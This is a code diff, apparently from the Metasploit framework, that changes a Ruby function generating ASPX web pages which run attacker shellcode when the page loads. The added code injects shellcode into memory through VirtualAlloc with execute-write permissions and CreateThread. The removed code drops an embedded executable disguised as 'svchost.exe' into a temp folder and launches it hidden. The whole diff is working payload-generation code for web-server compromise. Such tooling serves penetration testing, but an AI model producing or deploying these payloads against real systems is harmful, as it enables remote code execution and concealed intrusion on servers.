@@ -1089,8 +1089,8 @@ End Sub
 		vbs
 	end
 
-	def self.to_exe_aspx(exes = '', opts={})
-		exe = exes.unpack('C*')
+	def self.to_exe_aspx(code = '', opts={})
+		buf = Rex::Text.to_csharp(code)
 
 		var_file = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1103,45 +1103,21 @@ End Sub
 		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
 		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
 		source << "<script runat=\"server\">\r\n"
+		source << "\tprivate static UInt32 MEM_COMMIT=0x1000;\r\n"
+		source << "\tprivate static UInt32 PAGE_EXECUTE_READWRITE=0x40;\r\n"
+		source << "\t[System.Runtime.InteropServices.DllImport(\"kernel32\")]\r\n"
+		source << "\tprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size,UInt32 flAllocationType,UInt32 flProtect);\r\n"
+		source << "\t[System.Runtime.InteropServices.DllImport(\"kernel32\")]\r\n"
+		source << "\tprivate static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize, UInt32 lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);\r\n"
 		source << "\tprotected void Page_Load(object sender, EventArgs e)\r\n"
 		source << "\t{\r\n"
-		source << "\t\tStringBuilder #{var_file} = new StringBuilder();\r\n"
-		source << "\t\t#{var_file}.Append(\"\\x#{exe[0].to_s(16)}"
-
-		1.upto(exe.length-1) do |byte|
-				# Apparently .net 1.0 has a limit of 2046 chars per line
-				if(byte % 100 == 0)
-						source << "\");\r\n\t\t#{var_file}.Append(\""
-				end
-				source << "\\x#{exe[byte].to_s(16)}"
-		end
-
-		source << "\");\r\n"
-		source << "\t\tstring #{var_tempdir} = Path.GetTempPath();\r\n"
-		source << "\t\tstring #{var_basedir} = Path.Combine(#{var_tempdir}, \"#{var_filename}\");\r\n"
-		source << "\t\tstring #{var_tempexe} = Path.Combine(#{var_basedir}, \"svchost.exe\");\r\n"
-		source << "\r\n"
-		source << "\t\tDirectory.CreateDirectory(#{var_basedir});\r\n"
-		source << "\r\n"
-		source << "\t\tFileStream fs = File.Create(#{var_tempexe});\r\n"
-		source << "\t\ttry\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tforeach (char #{var_iterator} in #{var_file}.ToString())\r\n"
-		source << "\t\t\t{\r\n"
-		source << "\t\t\t\tfs.WriteByte(Convert.ToByte(#{var_iterator}));\r\n"
-		source << "\t\t\t}\r\n"
-		source << "\t\t}\r\n"
-		source << "\t\tfinally\r\n"
-		source << "\t\t{\r\n"
-		source << "\t\t\tif (fs != null) ((IDisposable)fs).Dispose();\r\n"
-		source << "\t\t}\r\n"
-		source << "\r\n"
-		source << "\t\tSystem.Diagnostics.Process #{var_proc} = new System.Diagnostics.Process();\r\n"
-		source << "\t\t#{var_proc}.StartInfo.CreateNoWindow = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.UseShellExecute = true;\r\n"
-		source << "\t\t#{var_proc}.StartInfo.FileName = #{var_tempexe};\r\n"
-		source << "\t\t#{var_proc}.Start();\r\n"
-		source << "\r\n"
+		source << "\t\t" << buf
+		source << "\t\tUInt32 funcAddr = VirtualAlloc(0,(UInt32)buf.Length,MEM_COMMIT,PAGE_EXECUTE_READWRITE);\r\n"
+		source << "\t\tSystem.Runtime.InteropServices.Marshal.Copy(buf,0,(IntPtr)(funcAddr),buf.Length);\r\n"
+		source << "\t\tIntPtr hThread = IntPtr.Zero;\r\n"
+		source << "\t\tIntPtr pinfo = IntPtr.Zero;\r\n"
+		source << "\t\tUInt32 threadId = 0;\r\n"
+		source << "\t\thThread = CreateThread(0,0,funcAddr,pinfo,0,ref threadId);\r\n"
 		source << "\t}\r\n"
 		source << "</script>\r\n"
 		source
@@ -1245,7 +1221,7 @@ End Sub
 	end
 
 	def self.to_win32pe_aspx(framework, code, opts={})
-		to_exe_aspx(to_win32pe(framework, code, opts), opts)
+		to_exe_aspx(code, opts)
 	end
 
 	# Creates a jar file that drops the provided +exe+ into a random file name
